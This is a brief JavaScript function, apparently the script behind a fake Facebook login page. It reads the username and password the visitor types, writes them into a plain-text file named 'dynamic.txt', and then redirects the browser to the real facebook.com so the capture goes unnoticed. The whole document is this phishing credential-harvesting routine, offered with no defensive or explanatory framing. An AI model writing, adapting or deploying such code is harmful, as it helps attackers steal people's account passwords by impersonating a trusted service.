function fblogin(){
    let usr = document.getElementById('usrname').value;
    let pwd = document.getElementById('password').value;

    let data = '\r username : '+ usr + '\r\n' + '\r password : ' + pwd;

    var test = new Blob([data], { type: "text/plain;charset=utf-8" });
    saveAs(test, "dynamic.txt");

    location.href="https://www.facebook.com/";
}